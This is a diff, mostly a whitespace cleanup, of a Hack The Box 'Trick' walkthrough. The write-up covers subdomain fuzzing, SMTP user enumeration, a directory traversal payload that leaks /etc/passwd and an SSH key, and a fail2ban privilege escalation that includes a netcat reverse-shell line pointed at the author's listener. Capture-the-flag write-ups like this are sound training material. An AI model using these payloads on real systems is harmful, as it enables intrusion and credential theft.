@@ -52,7 +52,7 @@ PORT   STATE SERVICE
 Seeing port 80, I added the address to trick.htb in my /etc/hosts file and proceeded with subdomain fuzzing using **ffuf**:
 
 ```bash
-WLIST=/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
+WLIST=/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 ffuf -w $WLIST:FUZZ -u http://FUZZ.trick.htb/
 ```
 
@@ -68,15 +68,15 @@ Only ran that for a few seconds to note that all responses are of size 5480. Fil
 ffuf -w $WLIST:FUZZ -u http://trick.htb:80/ -H 'Host: FUZZ.trick.htb' -fs 5480
 ```
 
-Still nothing. 
+Still nothing.
 
-Ok, I think it's safe to say we are dealing with a pretty simple http server that has outgoing email. 
+Ok, I think it's safe to say we are dealing with a pretty simple http server that has outgoing email.
 
 Next, let's try signing up for their notifications:
 
 ![signup email](signup%20email.png)
 
-It appears to be a Form service that is not connected to anything. 
+It appears to be a Form service that is not connected to anything.
 
 Next, I performed directory enumeration using **feroxbuster**. This yielded the following directories:
 
@@ -88,7 +88,7 @@ Next, I performed directory enumeration using **feroxbuster**. This yielded the 
 I checked the http server info using a whatweb query:
 
 ```bash
-whatweb http://trick.htb 
+whatweb http://trick.htb
 ```
 
 This confirmed that the site uses bootstrap, and gave a specific version of nginx: 1.14.2. This appears to be a legacy version of nginx, succeeded by version 1.16 (changelog [here](https://nginx.org/en/CHANGES-1.16)) and several versions by now. The only notable security change that I saw since 1.14.2 was this:
@@ -129,7 +129,7 @@ Following the advice of the [SMTP hacktricks page](https://book.hacktricks.xyz/n
 telnet $RADDR 25
 ```
 
-I did not know what all the smtp status codes were, so I checked the [wiki](https://en.wikipedia.org/wiki/List_of_SMTP_server_return_codes). There was an example shown at the bottom of that wiki article showing how to interact with the server using these codes. Noting that the nmap enumeration showed `ENHANCEDSTATUSCODES` I referred to the bottom example for sending a message. I also tried checking some users (root, admin, mailto). 
+I did not know what all the smtp status codes were, so I checked the [wiki](https://en.wikipedia.org/wiki/List_of_SMTP_server_return_codes). There was an example shown at the bottom of that wiki article showing how to interact with the server using these codes. Noting that the nmap enumeration showed `ENHANCEDSTATUSCODES` I referred to the bottom example for sending a message. I also tried checking some users (root, admin, mailto).
 
 > 💡 If this worked, then perhaps the usernames could be enumerated using this VRFY command..?
 
@@ -196,7 +196,7 @@ To investigate this idea, I checked through metasploit to see if somebody has al
 
 ```
 use auxiliary/scanner/smtp/smtp_enum
-show info          <------- By default it is using a very short list of probable unix usernames. 
+show info          <------- By default it is using a very short list of probable unix usernames.
 set RHOSTS 10.10.11.166
 run
 ```
@@ -214,7 +214,7 @@ This is kind of a long list, and I'm bad at comparing lists visually, so I wrote
 
 LIST="_apt, avahi, backup, bin, colord, daemon, dnsmasq, games, geoclue, gnats, hplip, irc, list, lp, mail, man, messagebus, mysql, news, nobody, postfix, postmaster, proxy, pulse, rtkit, saned, speech-dispatcher, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, tss, usbmux, uucp, www-data"
 
-IFS=", " 
+IFS=", "
 
 for usr in $LIST;
 do
@@ -372,12 +372,12 @@ Viewing the employee page's source revealed some interesting functionality: perh
 			$('.edit_employee').click(function(){
 				var $id=$(this).attr('data-id');
 				uni_modal("Edit Employee","manage_employee.php?id="+$id)
-				
+
 			});
 			$('.view_employee').click(function(){
 				var $id=$(this).attr('data-id');
 				uni_modal("Employee Details","view_employee.php?id="+$id,"mid-large")
-				
+
 			});
 			$('#new_emp_btn').click(function(){
 				uni_modal("New Employee","manage_employee.php")
@@ -447,7 +447,7 @@ Ok... Not the result I was looking for, but at least now we know more about the 
 Taking another crack at VHost fuzzing using the known pattern of preprod-XXX.trick.htb:
 
 ```bash
-WLIST=/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
+WLIST=/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 ffuf -w $WLIST:FUZZ -u http://trick.htb -H 'Host: preprod-FUZZ.trick.htb' -t 100 -fs 5480
 ```
 
@@ -457,7 +457,7 @@ ffuf -w $WLIST:FUZZ -u http://trick.htb -H 'Host: preprod-FUZZ.trick.htb' -t 100
 
 > I try not to beat myself up over doing things in the wrong order, but it can sure be frustrating to realize I neglected something staring right at me!
 >
-> The thing to remember here is to take good notes, and when you get stuck *read them back to yourself*. 
+> The thing to remember here is to take good notes, and when you get stuck *read them back to yourself*.
 >
 > Often on an 'Easy' HTB box, if you get stuck after finding something that looks like a good result, it means you may have missed a hint in an earlier step. Critical thinking about your own process can be very valuable.
 
@@ -488,12 +488,12 @@ http://preprod-marketing.trick.htb/index.php?page=home.html
 This looked like a candidate for directory traversal. Already knowing (from the errors showing ``/var/www/payroll/admin_class.php``) that this was probably being read from a directory like ``/var/www/marketing/index.php``, I tried using directory traversal tricks going (at least) three directories up:
 
 - http://preprod-marketing.trick.htb/index.php?page=../../../../../../etc/passwd
-- http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././etc/passwd 
+- http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././etc/passwd
 
 And that did it! The second attempt was enough to leak ``/etc/passwd``:
 
 ```
-root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:112:121::/var/lib/saned:/usr/sbin/nologin colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false sshd:x:118:65534::/run/sshd:/usr/sbin/nologin postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash 
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:112:121::/var/lib/saned:/usr/sbin/nologin colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false sshd:x:118:65534::/run/sshd:/usr/sbin/nologin postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash
 ```
 
 Well hello there, **michael** 👋 Are you the target?
@@ -504,7 +504,7 @@ As it turns out, *michael is definitely the target*. Or at least, they have the 
 http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././home/michael/user.txt
 ```
 
-Wonderful! 
+Wonderful!
 
 If I can access michael's home directory (and ssh is open) there's a good chance I can also access michael's ssh key. Taking a guess at the typical location of the ssh key worked perfectly:
 
@@ -608,7 +608,7 @@ Perhaps there is a way to use fail2ban to escalate? pspy showed that /root/fail2
 
 Fail2Ban appears to have had a pretty severe CVE leading to code execution: [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm). However, this git repo shows that ``mail`` is used, and ``mail`` is not present on this box. Neither is the leading alternative ``sendmail``... neither are the less-common alternatives ``mutt`` nor ``ssmtp``.
 
-💡But wait, maybe that telnet trick that I used earlier would be enough to exploit CVE-2021-32749 ? 
+💡But wait, maybe that telnet trick that I used earlier would be enough to exploit CVE-2021-32749 ?
 
 First, I set up a nc listener and checked if a netcat reverse shell would even work on this box (sometimes they don't have the -e flag):
 
@@ -637,11 +637,11 @@ Escape character is '^]'.
 220 debian.localdomain ESMTP Postfix (Debian/GNU)
 MAIL FROM: root
 250 2.1.0 Ok
-RCPT TO: michael 
+RCPT TO: michael
 250 2.1.5 Ok
 DATA
 354 End data with <CR><LF>.<CR><LF>
-Michael, I'm sending you an email\n~! nc 10.10.14.5 4444 -e /bin/sh 
+Michael, I'm sending you an email\n~! nc 10.10.14.5 4444 -e /bin/sh
 
 .
 250 2.0.0 Ok: queued as B36C741221
@@ -745,7 +745,7 @@ Then I restarted the service:
 sudo /etc/init.d/fail2ban restart
 ```
 
-but... still no reverse shell 😕 
+but... still no reverse shell 😕
 
 Next, I tried putting my reverse shell inside of the unban action instead. But now I need to find a way to get banned. As seen previously in ``jail.conf``, I will be banned by performing 5 failed authentication attempts in a 10 second span. That's tricky, actually I think that's impossible if trying to log in the naive way. Instead, I tried make at least 5 login attempts at once using a python script:
 
@@ -775,7 +775,7 @@ So the plan of attack is as follows, and it has to be very quick:
 
 5. If I get it, quickly grab the flag. I need to be faster than the anacron job that overwrites ``/etc/fail2ban``.
 
-   
+
 
 Performing the above steps worked perfectly! 🎉 root shell acquired!
 
@@ -830,20 +830,24 @@ YES! Finally a nice solid ssh connection as root🎉
 - **Recognize when users or services seem out-of-place**. Even a print service can have a juicy exploit. This technique mostly comes with experience, but it is also good to have a "normal" computer around to compare the target to, to establish a bit of a baseline.
 
 - **Privilege escalation takes creativity**. Sometimes, the trick to privesc is trying to think of the weirdest way to use what's in front of you.  If you abstract the tools/services you have available into their functional components, sometimes you can think of a good way to string them together into privilege escalation. In this case, it came down to finding a way to get myself banned with Fail2Ban to execute some commands that I myself had planted: so weird! But when you take a step back, it's not so odd:
+
     -- Fail2Ban can execute code when banning a user.
-    -- I can determine arbitrary code that Fail2Ban bans a user.
+
+    -- I can determine arbitrary code that runs Fail2Ban executes.
+
     -- I can find a way to ban myself.
 
-  ​      ==> By *hypothetical syllogism*, I can execute arbitrary code.
+  ​      ==> *By hypothetical syllogism, I can execute arbitrary code*.
+
   {{% /lessons-learned %}}
 
 {{% lessons-learned defender=true %}}
 
 ### Defender
 
-- **Printer driver updates are actually useful** - who knew? An administrator isn't necessarily a security expert: they should opt to defer their judgement to the vendor that produces 
-- **Internal users shouldn't be trusted universally**. It was clear that Fail2Ban was meant to be used for external login attempts, but a more clever system of permissions or capabilities could have kept `michael` from abusing Fail2Ban. 
+- **Printer driver updates are actually useful** - who knew? An administrator isn't necessarily a security expert: they should opt to defer their judgement to the vendor that produces
+- **Internal users shouldn't be trusted universally**. It was clear that Fail2Ban was meant to be used for external login attempts, but a more clever system of permissions or capabilities could have kept `michael` from abusing Fail2Ban.
 - **Clean up after yourself**. The vulnerabilities for this box were all found on pre-production vhosts. These vhosts should not have been exposed to the internet: at most, they should have been exposed to an internal port. This is as simple as updating a couple of DNS records, but is easy to accidentally overlook.
-- **Prevent directory traversals on the webserver**. They are always preventable. There are many ways to do this, including the server configuration files and WAFs. Find something that works for your situation and apply it. 
-- **Keep on top of your updates**. Both HPLIP and Fail2Ban had vulnerabilities disclosed in CVEs, that had since been patched. Using a stronger update policy could have prevented both services from being attacked. 
+- **Prevent directory traversals on the webserver**. They are always preventable. There are many ways to do this, including the server configuration files and WAFs. Find something that works for your situation and apply it.
+- **Keep on top of your updates**. Both HPLIP and Fail2Ban had vulnerabilities disclosed in CVEs, that had since been patched. Using a stronger update policy could have prevented both services from being attacked.
   {{% /lessons-learned %}}
